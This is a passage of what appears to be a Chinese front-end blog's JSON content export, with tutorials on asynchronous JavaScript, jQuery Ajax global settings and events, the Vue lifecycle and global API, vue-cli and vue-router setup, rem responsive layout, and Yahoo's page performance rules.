此外，f2完成执行后，也可以取消订阅（unsubscribe）。 jQuery.unsubscribe(“done”, f2); 这种方法的性质与”事件监听”类似，但是明显优于后者。因为我们可以通过查看”消息中心”，了解存在多少信号、每个信号有多少订阅者，从而监控程序的运行。 四、Promises对象 Promises对象是CommonJS工作组提出的一种规范，目的是为异步编程提供统一接口。 简单说，它的思想是，每一个异步任务返回一个Promise对象，该对象有一个then方法，允许指定回调函数。比如，f1的回调函数f2,可以写成： f1().then(f2); f1要进行如下改写（这里使用的是jQuery的实现）： function f1(){ var dfd = $.Deferred(); setTimeout(function () { // f1的任务代码 dfd.resolve(); }, 500); return dfd.promise; } 这样写的优点在于，回调函数变成了链式写法，程序的流程可以看得很清楚，而且有一整套的配套方法，可以实现许多强大的功能。 比如，指定多个回调函数： f1().then(f2).then(f3); 再比如，指定发生错误时的回调函数： f1().then(f2).fail(f3); 而且，它还有一个前面三种方法都没有的好处：如果一个任务已经完成，再添加回调函数，该回调函数会立即执行。所以，你不用担心是否错过了某个事件或信号。这种方法的缺点就是编写和理解，都相对比较难。 五、参考链接 Asynchronous JS: Callbacks, Listeners, Control Flow Libs and Promises （完） 转载自http://www.ruanyifeng.com/blog/2012/12/asynchronous%EF%BC%BFjavascript.html","comments":true,"tags":[{"name":"js","slug":"js","permalink":"http://www.wanyifeng.top/tags/js/"},{"name":"ajax","slug":"ajax","permalink":"http://www.wanyifeng.top/tags/ajax/"}]},{"title":"Ajax进阶","date":"2016-12-30T12:13:21.000Z","path":"2016/12/30/Ajax进阶/","text":"普通的Ajax ​ 这是一段普通的Ajax请求,当我们需要在每一次Ajax请求前后是触发某一些事件会非常麻烦 通常的做法就是在每一次请求时候写一次逻辑代码 如下: 12345678910111213141516171819202122&lt;body&gt; &lt;button&gt; click &lt;/button&gt;&lt;/body&gt;&lt;script&gt; $( 'button' ).click(function () &#123; $.ajax(&#123; beforeSend: function () &#123; // 发送请求之前触发 NProgress.start(); &#125;, complete: function () &#123; // 请求完成之后触发 NProgress.done(); &#125;, url: './02.php', type: 'get', success: function ( info ) &#123; console.log( info ); &#125; &#125;); &#125;);&lt;/script&gt; ​ 这样做会使我们的代码变得非常冗余不够优雅,那么有没有一种可以提供ajax默认触发的一种方式呢? 在jquery中其实提供了一个全局的Ajax配置的方式 如下: 123456789101112131415161718// 设置全局 ajax 操作 $.ajaxSetup(&#123; // 所有选项与 $.ajax 一模一样 beforeSend: function () &#123; // 发送请求之前触发 NProgress.start(); &#125;, complete: function () &#123; // 请求完成之后触发 NProgress.done(); &#125;, url: './02.php', type: 'get', success: function ( info ) &#123; console.log( info ); &#125; &#125;); ​ 这样做在你发送Ajax请求的时候会自动执行你设置的方式进行请求; 12345$( 'button' ).click(function () &#123; $.ajax(&#123; url: './03.php' &#125;); &#125;); ​ 只有我们重写了他的某一个属性时就会以当前的属性加上默认的属性发送请求; Ajax函数的生命周期123456789101112131415161718192021222324252627282930313233343536373839![ajaxup02](D:\\blog\\source\\images\\ajaxup02.png)![ajaxup03](D:\\blog\\source\\images\\ajaxup03.png)![ajaxup04](D:\\blog\\source\\images\\ajaxup04.png) $( document ) .ajaxStart(function () &#123;//所有的Ajax请求开始 只触发一次 当再有Ajax请求是不会再次触发改事件 $( '.ajaxStart' ).append( '&lt;span&gt;ajaxStart&lt;/span&gt;&lt;br&gt;' ); &#125;) .ajaxSend(function () &#123;//每一个Ajax请求发送之前触发 $( '.ajaxSend' ).append( '&lt;span&gt;ajaxSend&lt;/span&gt;&lt;br&gt;' ); &#125;) .ajaxError(function () &#123;//当Ajax 函数发生错误时触发该函数 $( '.ajaxError' ).append( '&lt;span&gt;ajaxError&lt;/span&gt;&lt;br&gt;' ); &#125;) .ajaxSuccess(function () &#123;//当Ajax 函数触发成功后触发 $( '.ajaxSuccess' ).append( '&lt;span&gt;ajaxSuccess&lt;/span&gt;&lt;br&gt;' ); &#125;) .ajaxComplete(function () &#123;//当每一个Ajax 函数完成后触发改事件 $( '.ajaxComplete' ).append( '&lt;span&gt;ajaxComplete&lt;/span&gt;&lt;br&gt;' ); &#125;) .ajaxStop(function () &#123; // 所有的Ajax请求都结束后触发改事件 $( '.ajaxStop' ).append( '&lt;span&gt;ajaxStop&lt;/span&gt;&lt;br&gt;' ); &#125;); $( '#btn1' ).click(function () &#123; $.ajax( &#123; url: './04-1.php', success: function ( info ) &#123; console.log( info ); &#125; &#125;); &#125;); $( '#btn2' ).click(function () &#123; $.ajax( &#123; // url: './04-2.php', ![ajaxup01](D:\\blog\\source\\images\\ajaxup01.png) url: '/api/teacher/edit', success: function ( info ) &#123; console.log( info ); &#125; &#125;); &#125;); PHP文件代码如下 1234&lt;?php sleep( 10 ); echo '04-1.php';?&gt; 1234&lt;?php sleep( 5 ); echo '04-2.php';?&gt; 事件触发过程 当我点击5s的按钮或者10s按钮时候点击完毕后触发 当我点击5s的按钮或者10s按钮时候点击完毕并且成功后触发 当我先点击5s按钮后在点击10s按钮后触发的事件 当我点击5s按钮和10s按钮后请求都成功后都触发情况","comments":true,"tags":[{"name":"js","slug":"js","permalink":"http://www.wanyifeng.top/tags/js/"},{"name":"ajax","slug":"ajax","permalink":"http://www.wanyifeng.top/tags/ajax/"}]},{"title":"Vue生命周期","date":"2016-12-28T10:23:21.000Z","path":"2016/12/28/Vue实例详解与生命周期/","text":"Vue的实例是Vue框架的入口，其实也就是前端的ViewModel，它包含了页面中的业务逻辑处理、数据模型等，当然它也有自己的一系列的生命周期的事件钩子，辅助我们进行对整个Vue实例生成、编译、挂着、销毁等过程进行js控制。 Vue实例的computed 介绍 Vue的计算属性（computed)的属性会自动混入Vue的实例中。所有 getter 和 setter 的 this 上下文自动地绑定为 Vue 实例。这就很强大了，再计算属性中定义的函数里面可以直接使用指向了vue实例的this，异常方便的啊。 类型 { 键：函数}{ [key: string]: Function | { get: Function, set: Function } }当然，可以省略setter,如果省略了setter，那么值就可以是普通函数，但是必须有返回值。 官方的实例12345678910111213141516171819202122var vm = new Vue(&#123; data: &#123; a: 1 &#125;, computed: &#123; // 仅读取，值只须为函数 aDouble: function () &#123; return this.a * 2 &#125;, // 读取和设置 aPlus: &#123; get: function () &#123; return this.a + 1 &#125;, set: function (v) &#123; this.a = v - 1 &#125; &#125; &#125;&#125;)vm.aPlus // -&gt; 2vm.aPlus = 3vm.a // -&gt; 2vm.aDouble // -&gt; 4 methods 类型: { [key: string]: Function } 详细: methods 将被混入到 Vue 实例中。可以直接通过 VM 实例访问这些方法，或者在指令表达式中使用。方法中的 this 自动绑定为 Vue 实例。 注意，不应该使用箭头函数来定义 method 函数 (例如 plus: () =&gt; this.a++)。理由是箭头函数绑定了父级作用域的上下文，所以 this 将不会按照期望指向 Vue 实例，this.a 将是 undefined。 示例: 12345678910var vm = new Vue(&#123; data: &#123; a: 1 &#125;, methods: &#123; plus: function () &#123; this.a++ &#125; &#125;&#125;)vm.plus()vm.a // 2 watch 类型 { [key: string]: string | Function | Object } 详细: 一个对象，键是需要观察的表达式，值是对应回调函数。值也可以是方法名，或者包含选项的对象。Vue 实例将会在实例化时调用 $watch()，遍历 watch 对象的每一个属性。 示例: 1234567891011121314151617181920var vm = new Vue(&#123; data: &#123; a: 1, b: 2, c: 3 &#125;, watch: &#123; // 监控a变量变化的时候，自动执行此函数 a: function (val, oldVal) &#123; console.log('new: %s, old: %s', val, oldVal) &#125;, // 深度 watcher c: &#123; handler: function (val, oldVal) &#123; /* ... */ &#125;, deep: true &#125; &#125;&#125;)vm.a = 2 // -&gt; new: 2, old: 1//注意，不应该使用箭头函数来定义 watcher 函数 (例如 searchQuery: newValue =&gt; this.updateAutocomplete(newValue))。理由是箭头函数绑定了父级作用域的上下文，所以 this 将不会按照期望指向 Vue 实例，this.updateAutocomplete 将是 undefined。 设置el的详解 类型 string | HTMLElement 限制： 只在由 new 创建的实例中遵守。 详细： 提供一个在页面上已存在的 DOM 元素作为 Vue 实例的挂载目标,也就是说Vue绑定数据到哪里去找。可以是CSS 选择器，也可以是一个 HTMLElement实例。 在实例挂载之后， 元素可以用 vm.$el 访问。 如果这个选项在实例化时有作用，实例将立即进入编译过程，否则，需要显式调用 vm.$mount() 手动开启编译。 12345// 几乎所有例子都用到这个var app = new Vue(&#123; el: '#app', ...&#125;); Vue实例的生命周期Vue实例有一个完整的生命周期，也就是从开始创建、初始化数据、编译模板、挂载Dom、渲染→更新→渲染、卸载等一系列过程，我们称这是Vue的生命周期。通俗说就是Vue实例从创建到销毁的过程，就是生命周期。 在Vue的整个生命周期中，它提供了一系列的事件，可以让我们注册js方法，可以让我们达到控制整个过程的目的地， 首先看看下面官网的一张生命周期的图， Vue提供的可以注册的钩子都在上图片的红色框标注。他们是： beforeCreate 在实例初始化之后，数据观测(data observer) 和 event/watcher 事件配置之前被调用。 created 实例已经创建完成之后被调用。在这一步，实例已完成以下的配置：数据观测(data observer)，属性和方法的运算， watch/event 事件回调。然而，挂载阶段还没开始，$el 属性目前不可见。 beforeMount 在挂载开始之前被调用：相关的 render 函数首次被调用。 mounted el 被新创建的 vm. $el 替换，并挂载到实例上去之后调用该钩子。如果 root 实例挂载了一个文档内元素，当 mounted 被调用时 vm. $el 也在文档内。 beforeUpdate 数据更新时调用，发生在虚拟 DOM 重新渲染和打补丁之前。你可以在这个钩子中进一步地更改状态，这不会触发附加的重渲染过程。 updated 由于数据更改导致的虚拟 DOM 重新渲染和打补丁，在这之后会调用该钩子。 当这个钩子被调用时，组件 DOM 已经更新，所以你现在可以执行依赖于 DOM 的操作。然而在大多数情况下，你应该避免在此期间更改状态，因为这可能会导致更新无限循环。 该钩子在服务器端渲染期间不被调用。 beforeDestroy 实例销毁之前调用。在这一步，实例仍然完全可用。 destroyed Vue 实例销毁后调用。调用后，Vue 实例指示的所有东西都会解绑定，所有的事件监听器会被移除，所有的子实例也会被销毁。该钩子在服务器端渲染期间不被调用。","comments":true,"tags":[{"name":"Vue","slug":"Vue","permalink":"http://www.wanyifeng.top/tags/Vue/"}]},{"title":"rem百分比布局","date":"2016-12-25T12:58:48.000Z","path":"2016/12/25/rem百分比布局/","text":"​ 上一篇文章我分享了淘宝写的一篇rem的介绍，介绍的非常全面，但是他们似乎都把关注点放在了字体单位上了，其实rem不只是能应用到字体上面，还可以应用到长度和宽度上面。 http://wanyifeng.top/2016/12/15/web%20app%E5%8F%98%E9%9D%A9%E4%B9%8Brem%EF%BC%88%E6%89%8B%E6%9C%BA%E5%B1%8F%E5%B9%95%E5%AE%9E%E7%8E%B0%E5%85%A8%E9%80%82%E9%85%8D%EF%BC%89/ 设置对应的响应式的html rem比例​ 我们平常在使用长度单位都会使用px，但是在做上面的响应式的时候，需要用rem或者百分比的单位。 123456789101112html&#123; font-size:62.5%; /* 10÷16=62.5% */&#125;body&#123; font-size:12px; font-size:1.2rem ; /* 12÷10=1.2 */&#125;p&#123; font-size:14px; font-size:1.4rem;&#125;/*通过设置html的font-size值来控制全局的rem输出，这段代码其实是这个rem的精髓所在，*/ 如下的代码来控制不同设备下的字体大小显示使其达到自适应： 123456789101112131415161718html &#123; font-size: 62.5%; /* 10÷16=62.5% */&#125;@media only screen and (min-width: 481px)&#123; html &#123; font-size: 94%!important; /* 15.04÷16=94% */ &#125;&#125;@media only screen and (min-width: 561px)&#123; html &#123; font-size: 109%!important; /* 17.44÷16=109% */ &#125;&#125;@media only screen and (min-width: 641px)&#123; html &#123; font-size: 125%!important; /* 20÷16=125% */ &#125;&#125; 给其他元素设置rem 12345margin-top:.2rem; /*40 ÷ 20 = 2*/padding-top:1rem /* 20 ÷ 20 =1 */height:100px; /* 100 ÷ 20 = 5rem;*/width:50px; /* 50 ÷ 20 = 2.5rem;*//*20为根节点的font-size*/","comments":true,"tags":[{"name":"css","slug":"css","permalink":"http://www.wanyifeng.top/tags/css/"},{"name":"移动端","slug":"移动端","permalink":"http://www.wanyifeng.top/tags/移动端/"}]},{"title":"Vue脚手架工具","date":"2016-12-25T02:33:21.000Z","path":"2016/12/25/Vue脚手架工具/","text":"其实如果编写Vue的前端项目，直接使用vue的官方vue-cli构建工具最好用，一个命令就可以直接生成项目的结构和目录。而且官方需要依赖的包也可以自动配置好，只需要npm instal一下，然后就可以开发测试了。 vue-cli安装1234567# 安装vue-cli。 安装之前首先确保你已经安装好了nodejs 而且打开命令行$ npm install -g vue-cli# 校验一下是否安装成功$ vue -V#=&gt; 2.5.1 我当前的版本是这个，你的可能比这个新 使用vue-cli初始化项目通过以下命令的方式可以创建一个项目文件夹，并初始化对应的文件。 1$ vue init &lt;template-name&gt; &lt;project-name&gt; 其中template-name可以取以下值，每个值对应不同的项目构建的模板。 webpack–全功能的Webpack + vueify，包括热加载，静态检测，单元测试 webpack-simple–一个简易的Webpack + vueify，以便于快速开始。 browserify–全功能的Browserify + vueify，包括热加载，静态检测，单元测试 browserify-simple–一个简易的Browserify + vueify，以便于快速开始。 安装和开发控制台的命令： 1234567891011121314# 如果已经安装，请省略$ npm install -g vue-cli# 初始化一个webpack全功能包的vue项目，请您把my-project换成你自己的项目名。$ vue init webpack my-project# 用命令行进入当前项目目录$ cd my-project# npm安装所有的依赖的包$ npm install# 运行测试的首页$ npm run dev 综合实例开发记录 通过vue-cli构建工具初始化项目目录 安装过程，控制台会问你项目名称是什么？项目描述？项目作者，是否使用eslint校验，是否使用单元测试等…. 我的安装过程如下请参考： 1234567891011121314151617181920212223242526272829$ vue init webpack ttl # =&gt; 安装webpack模板的项目 ttl（项目名可以随便取） A newer version of vue-cli is available. latest: 2.6.0 installed: 2.5.1 This will install Vue 2.x version of template. For Vue 1.x use: vue init webpack#1.0 ttl? Project name mydemovue # =&gt; 项目名称? Project description A Vue.js project # =&gt; 项目描述? Author malun &lt;malun666@126.com&gt; # =&gt; 作者? Vue build standalone # =&gt; 是否支持单文件组件? Use ESLint to lint your code? Yes # =&gt; 是否支持ESLint代码校验? Pick an ESLint preset Standard # =&gt; 校验的标准是什么？? Setup unit tests with Karma + Mocha? Yes # =&gt; 是否使用单元测试? Setup e2e tests with Nightwatch? Yes # =&gt; 是否使用e2e测试 vue-cli · Generated \"ttl\". To get started: cd ttl npm install npm run dev Documentation can be found at https://vuejs-templates.github.io/webpack 通过上面一系列的命令后，我们就会创建一个webpack配置好的项目包。目录结构如下： 1234567891011121314ttl |--.babelrc #=&gt; babel的配置文件，主要用于转换es6等最新的js语法。|--.editorconfig #=&gt; 编辑器配置 |--.eslintignore #=&gt; eslint的忽略校验的配置文件|--.eslintrc.js #=&gt; eslint的配置校验js是否规范的配置文件|--.gitignore #=&gt; 设置git忽略的管理的文件|--README.md #=&gt; readme说明文件|--build/ #=&gt; 自动构建存放的文件地方|--config/ #=&gt; 当前开发、测试等配置的文件，需要懂点nodejs了啊。|--index.html #=&gt; 项目的主入口的模板|--package.json #=&gt; npm的配置文件|--src/ #=&gt; 源码目录|--static/ #=&gt; 静态资源存放的目录|--test/ #=&gt; 测试相关目录 初始化依赖包 12345$ cd ttl #=&gt; 进入上面创建好的项目目录$ npm install #=&gt; 安装所有的依赖包。 安装过程可能非常长，网络也可能有问题，请耐心等待。# 安装完成后，可以直接运行测试,如果自动打开浏览器，并跳转到http://localhost:8080/ 说明一切都ok了。$ npm run dev npm 安装的时候经常网会断开，国内的网（哎，说多了都是泪）你懂的。最好能科学上网，或者是用淘宝的npm的镜像 安装vue-router组件 1$ npm i -S vue-router 到项目的 /src/components/ 目录下创建三个组件文件。 分别是： 首页组件 12345678910111213141516171819202122&lt;template&gt; &lt;div class=\"home\"&gt; &lt;h3&gt;&#123;&#123; msg &#125;&#125;&lt;/h3&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123; name: 'home', // 组件可以有自己的名字。 data () &#123; // 组件的data必须是函数 return &#123; msg: '这里是Home视图' &#125; &#125;&#125;&lt;/script&gt;&lt;style scoped&gt;h3 &#123; background-color: #82c;&#125;&lt;/style&gt; 用户首页组件 12345678910111213141516171819202122&lt;template&gt; &lt;div&gt; &lt;h3&gt;&#123;&#123; msg &#125;&#125;&lt;/h3&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123; // es6的模块导出定义语法，此模块导出默认的对象 name: 'user', // 组件可以有自己的名字。 data () &#123; // 组件的data必须是函数 return &#123; msg: '这里是User视图' &#125; &#125;&#125;&lt;/script&gt;&lt;style scoped&gt;h3 &#123; background-color: red;&#125;&lt;/style&gt; 产品组件 12345678910111213141516171819202122&lt;template&gt; &lt;div class=\"product\"&gt; &lt;h3&gt;&#123;&#123; msg &#125;&#125;&lt;/h3&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123; name: 'product', // 组件可以有自己的名字。 data () &#123; // 组件的data必须是函数 return &#123; msg: '这里是Home视图' &#125; &#125;&#125;&lt;/script&gt;&lt;style scoped&gt;h3 &#123; background-color: green;&#125;&lt;/style&gt; 项目的目录结构为： 123456ttl|-- src |--|-- Hello.vue|--|-- Home.vue|--|-- Product.vue|--|-- User.vue 创建router对象及配置路由 在src目录下创建approuter.js文件。然后添加如下代码： 123456789101112import VueRouter from 'vue-router' // 导入路由模块 import Home from './components/Home.vue' // 导入Home组件import User from './components/User.vue'import Product from './components/Product.vue'export default new VueRouter(&#123; // 定义路由规则对象 routes: [ &#123;path: '/home', component: Home&#125;, &#123;path: '/user/:id', component: User&#125;, &#123;path: '/product/:id', component: Product&#125; ]&#125;) 修改main.js文件找到src/目录下的main.js文件，共修改4处，添加路由引用、添加路由规则对象导入、启用路由、将路由键入到Vue中。修改此文件为： 1234567891011121314151617// The Vue build version to load with the `import` command// (runtime-only or standalone) has been set in webpack.base.conf with an alias.import Vue from 'vue'import App from './App'import VueRouter from 'vue-router' // +++1、导入路由组件import router from './approuter' // +++2、导入我们自己写的路由配置文件// +++ 3、使用路由组件Vue.use(VueRouter)/* eslint-disable no-new */new Vue(&#123; el: '#app', template: '&lt;App/&gt;', components: &#123; App &#125;, router: router // +++4、添加路由对象&#125;) 在app.vue中添加路由导航 最终代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;template&gt; &lt;div id=\"app\"&gt; &lt;nav class=\"top-menu\"&gt; &lt;ul &gt; &lt;li v-for=\"item in menuList\"&gt; &lt;router-link :to=\"item.url\"&gt;&#123;&#123; item.name &#125;&#125;&lt;/router-link&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/nav&gt; &lt;hr&gt; &lt;div&gt; &lt;router-view&gt;&lt;/router-view&gt; &lt;/div&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123; name: 'app', data: function () &#123; return &#123; menuList: [ &#123; name: '首页', url: '/home' &#125;, &#123; name: '用户', url: '/user/19' &#125;, &#123; name: '产品', url: '/product/20' &#125; ] &#125; &#125;&#125;&lt;/script&gt;&lt;style&gt;#app &#123; &#125;.top-menu ul, .top-menu li &#123; list-style: none;&#125;.top-menu &#123; overflow: hidden;&#125;.top-menu li &#123; float: left; width: 100px;&#125;&lt;/style&gt;","comments":true,"tags":[{"name":"Vue","slug":"Vue","permalink":"http://www.wanyifeng.top/tags/Vue/"}]},{"title":"Vue实例的全局配置","date":"2016-12-21T10:23:18.000Z","path":"2016/12/21/Vue实例的全局配置/","text":"Vue.config 是一个对象，包含 Vue 的全局配置。可以在启动应用之前修改下列属性： silent 类型： boolean 默认值： false 用法： 12Vue.config.silent = true//取消 Vue 所有的日志与警告。 optionMergeStrategies 类型： { [key: string]: Function } 默认值： {} 用法： 123456789Vue.config.optionMergeStrategies._my_option = function (parent, child, vm) &#123; return child + 1&#125;const Profile = Vue.extend(&#123; _my_option: 1&#125;)// Profile.options._my_option = 2//自定义合并策略的选项。//合并策略选项分别接受第一个参数作为父实例，第二个参数为子实例，Vue实例上下文被作为第三个参数传入。 devtools 类型： boolean 默认值： true (生产版为 false) 用法： 123// 务必在加载 Vue 之后，立即同步设置以下内容Vue.config.devtools = true//配置是否允许 vue-devtools 检查代码。开发版本默认为 true，生产版本默认为 false。生产版本设为 true 可以启用检查。 errorHandler 类型： Function 默认值： 默认抛出错误 用法： 12345Vue.config.errorHandler = function (err, vm) &#123; // handle error&#125;//指定组件的渲染和观察期间未捕获错误的处理函数。这个处理函数被调用时，可获取错误信息和 Vue 实例。//Sentry, an error tracking service, provides official integration using this option. 123456789101112- ignoredElements - 类型: Array&lt;string&gt; - 默认值: [] - 用法: ```js Vue.config.ignoredElements = [ 'my-custom-web-component', 'another-web-component' ] 须使 Vue 忽略在 Vue 之外的自定义元素 (e.g., 使用了 Web Components APIs)。否则，它会假设你忘记注册全局组件或者拼错了组件名称，从而抛出一个关于 Unknown custom element 的警告。 keyCodes 类型： { [key: string]: number | Array } 默认值： {} 用法： 1234567Vue.config.keyCodes = &#123; v: 86, f1: 112, mediaPlayPause: 179, up: [38, 87]&#125;//给 v-on 自定义键位别名。 Vue的全局APIVue的全局API提供大量的功能，我这里就给大家罗列几个常用的结果，其他的还是参考官网. Vue.nextTick语法： Vue.nextTick( [callback, context] ) 123参数： &#123;Function&#125; [callback]&#123;Object&#125; [context] 用法：在下次 DOM 更新循环结束之后执行延迟回调。在修改数据之后立即使用这个方法，获取更新后的 DOM。 123456// 修改数据vm.msg = 'Hello'// DOM 还没有更新Vue.nextTick(function () &#123; // DOM 更新了&#125;) Vue.set语法： Vue.set( object, key, value ) 12345参数：&#123;Object&#125; object&#123;string&#125; key&#123;any&#125; value返回值： 设置的值. 用法：设置对象的属性。如果对象是响应式的，确保属性被创建后也是响应式的，同时触发视图更新。这个方法主要用于避开 Vue 不能检测属性被添加的限制。注意对象不能是 Vue 实例，或者 Vue 实例的根数据对象。 Vue.compile 语法：Vue.compile( template ) 参数： {string} template 用法：12345678910//在render函数中编译模板字符串。只在独立构建时有效var res = Vue.compile('&lt;div&gt;&lt;span&gt;&#123;&#123; msg &#125;&#125;&lt;/span&gt;&lt;/div&gt;')new Vue(&#123; data: &#123; msg: 'hello' &#125;, render: res.render, staticRenderFns: res.staticRenderFns&#125;) 全局API总结其实还有几个其他的全局API，比如扩展组件Vue.extend 的用法、Vue.use加载插件、Vue.filter加载过滤器、Vue.directive自定义指令等","comments":true,"tags":[{"name":"Vue","slug":"Vue","permalink":"http://www.wanyifeng.top/tags/Vue/"}]},{"title":"雅虎的14条优化原则","date":"2016-12-21T06:33:21.000Z","path":"2016/12/21/雅虎的14条优化原则/","text":"​ 互联网已经成为人们生活中不可或缺一部分。原来的C/S架构都可以使用B/S架构实现 当然便利的同时毫无疑问的也使页面的速度越来越慢。在性能方面，根据Yahoo的调查，后台只占5%，而前端高达95%之多，其中有88%的东西是可以优化的。 雅虎的14条优化原则 方案 优化类型 1. 尽可能的减少 HTTP 的请求数 content 2. 使用 CDN（Content Delivery Network） server 3. 添加 Expires 头(或者 Cache-control ) server 4. Gzip 组件 server 5. 将 CSS 样式放在页面的上方 css 6. 将脚本移动到底部（包括内联的） javascript 7. 避免使用 CSS 中的 Expressions css 8. 将 JavaScript 和 CSS 独立成外部文件 javascript css 9. 减少 DNS 查询 content 10. 压缩 JavaScript 和 CSS (包括内联的) javascript css 11. 避免重定向 server 12. 移除重复的脚本 javascript 13. 配置实体标签（ETags） css 14. 使 AJAX 缓存 ajax 法则1. 减少HTTP请求次数80%的最终用户响应时间花在前端程序上，而其大部分时间则花在各种页面元素，如图像、样式表、脚本和Flash等，的下载上。减少页面元素将会减少HTTP请求次数。这是快速显示页面的关键所在。 一种减少页面元素个数的方法是简化页面设计。但是否存在其他方式，能做到既有丰富内容，又能获得快速响应时间呢？以下是这样一些技术： Image maps组合多个图片到一张图片中。总文件大小变化不大，但减少了HTTP请求次数从而加快了页面显示速度。该方式只适合图片连续的情况；同时坐标的定义是烦人又容易出错的工作。 CSS Sprites是更好的方法。它可以组合页面中的图片到单个文件中，并使用CSS的background-image和background-position属性来现实所需的部分图片。 Inline images使用data: URL scheme来在页面中内嵌图片。这将增大HTML文件的大小。组合inline images到你的（缓存）样式表是既能较少HTTP请求，又能避免加大HTML文件大小的方法。 Combined files通过组合多个脚本文件到单一文件来减少HTTP请求次数。样式表也可采用类似方法处理。这个方法虽然简单，但没有得到大规模的使用。10大美国网站每页平均有7个脚本文件和2个样式表。当页面之间脚本和样式表变化很大时，该方式将遇到很大的挑战，但如果做到的话，将能加快响应时间。 减少HTTP请求次数是性能优化的起点。这最提高首次访问的效率起到很重要的作用。据Tenni Theurer的文章Browser Cache Usage - Exposed!描述，40-60%的日常访问是首次访问，因此为首次访问者加快页面访问速度是用户体验的关键。 法则2. 使用CDN(Content Delivery Network, 内容分发网络)用户离web server的远近对响应时间也有很大影响。从用户角度看，把内容部署到多个地理位置分散的服务器上将有效提高页面装载速度。但是该从哪里开始呢？ 作为实现内容地理分布的第一步，不要试图重构web应用以适应分布架构。改变架构将导致多个周期性任务，如同步session状态，在多个server之间复制数据库交易。这样缩短用户与内容距离的尝试可能被应用架构改版所延迟，或阻止。 我们还记得80-90%的最终用户响应时间花在下载页面中的各种元素上，如图像文件、样式表、脚本和Flash等。与其花在重构系统这个困难的任务上，还不如先分布静态内容。这不仅能大大减少响应时间，而且由于CDN的存在，分布静态内容非常容易实现。 CDN是地理上分布的web server的集合，用于更高效地发布内容。通常基于网络远近来选择给具体用户服务的web server。 一些大型网站拥有自己的CDN，但是使用如Akamai Technologies, Mirror Image Internet, 或 Limelight Networks等CDN服务提供商的服务将是划算的。在Yahoo!把静态内容分布到CDN减少了用户影响时间20%或更多。切换到CDN的代码修改工作是很容易的，但能达到提高网站的速度。 法则3. 增加Expires Header网页内容正变得越来越丰富，这意味着更多的脚本文件、样式表、图像文件和Flash。首次访问者将不得不面临多次HTTP请求，但通过使用Expires header，您可以在客户端缓存这些元素。这在后续访问中避免了不必要的HTTP请求。Expires header最常用于图像文件，但是它也应该用于脚本文件、样式表和Flash。 浏览器（和代理）使用缓存来减少HTTP请求的次数和大小，使得网页加速装载。Web server通过Expires header告诉客户端一个元素可以缓存的时间长度。 如果服务器是Apache的话，您可以使用ExpiresDefault基于当期日期来设置过期日期，如： ExpiresDefault “access plus 10 years” 设置过期时间为从请求时间开始计算的10年。 请记住，如果使用超长的过期时间，则当内容改变时，您必须修改文件名称。在Yahoo!我们经常把改名作为release的一个步骤：版本号内嵌在文件名中，如yahoo_2.0.6.js。 法则4. 压缩页面元素通过压缩HTTP响应内容可减少页面响应时间。从HTTP/1.1开始，web客户端在HTTP请求中通过Accept-Encoding头来表明支持的压缩类型，如： Accept-Encoding: gzip, deflate. 如果Web server检查到Accept-Encoding头，它会使用客户端支持的方法来压缩HTTP响应，会设置Content-Encoding头，如：Content-Encoding: gzip。 Gzip是目前最流行及有效的压缩方法。其他的方式如deflate，但它效果较差，也不够流行。通过Gzip，内容一般可减少70%。如果是Apache，在1.3版本下需使用mod_gzip模块，而在2.x版本下，则需使用mod_deflate。 Web server根据文件类型来决定是否压缩。大部分网站对HTML文件进行压缩。但对脚本文件和样式表进行压缩也是值得的。实际上，对包括XML和JSON在内的任务文本信息进行压缩都是值得的。图像文件和PDF文件不应该被压缩，因为它们本来就是压缩格式保存的。对它们进行压缩，不但浪费CPU，而且还可能增加文件的大小。 因此，对尽量多的文件类型进行压缩是一种减少页面大小和提高用户体验的简便方法。 法则5. 把样式表放在头上我们发现把样式表移到HEAD部分可以提高界面加载速度，因此这使得页面元素可以顺序显示。 在很多浏览器下，如IE，把样式表放在document的底部的问题在于它禁止了网页内容的顺序显示。浏览器阻止显示以免重画页面元素，那用户只能看到空白页了。Firefox不会阻止显示，但这意味着当样式表下载后，有些页面元素可能需要重画，这导致闪烁问题。 HTML规范明确要求样式表被定义在HEAD中，因此，为避免空白屏幕或闪烁问题，最好的办法是遵循HTML规范，把样式表放在HEAD中。 法则6. 把脚本文件放在底部与样式文件一样，我们需要注意脚本文件的位置。我们需尽量把它们放在页面的底部，这样一方面能顺序显示，另方面可达到最大的并行下载。 浏览器会阻塞显示直到样式表下载完毕，因此我们需要把样式表放在HEAD部分。而对于脚本来说，脚本后面内容的顺序显示将被阻塞，因此把脚本尽量放在底部意味着更多内容能被快速显示。 脚本引起的第二个问题是它阻塞并行下载数量。HTTP/1.1规范建议浏览器每个主机的并行下载数不超过2个。因此如果您把图像文件分布到多台机器的话，您可以达到超过2个的并行下载。但是当脚本文件下载时，浏览器不会启动其他的并行下载，甚至其他主机的下载也不启动。 在某些情况下，不是很容易就能把脚本移到底部的。如，脚本使用document.write方法来插入页面内容。同时可能还存在域的问题。不过在很多情况下，还是有一些方法的。 一个备选方法是使用延迟脚本（deferred script）。DEFER属性表明脚本未包含document.write，指示浏览器刻继续显示。不幸的是，Firefox不支持DEFER属性。在IE中，脚本可能被延迟执行，但不一定得到需要的长时间延迟。不过从另外角度来说，如果脚本能被延迟执行，那它就可以被放在底部了。 法则7. 避免CSS表达式CSS表达式是功能强大的(同时也是危险的)用于动态设置CSS属性的方式。IE，从版本5开始支持CSS表达式，如backgourd-color: expression((new Date()).getHours()%2?”#B8D4FF”:”#F08A00”)，即背景色每个小时切换一次。 CSS表达式的问题是其执行次数超过大部分人的期望。不仅页面显示和resize时计算表达式，而且当页面滚屏，甚至当鼠标在页面上移动时都会重新计算表达式。 一种减少CSS表达式执行次数的方法是一次性表达式，即当第一次执行时就以明确的数值代替表达式。如果必须动态设置的话，可使用事件处理函数代替。如果您必须使用CSS表达式的话，请记住它们可能被执行上千次，从而影响页面性能。 法则8. 把JavaScript和CSS放到外部文件中上述很多性能优化法则都基于外部文件进行优化。现在，我们必须问一个问题：JavaScript和CSS应该包括在外部文件，还是在页面文件中？ 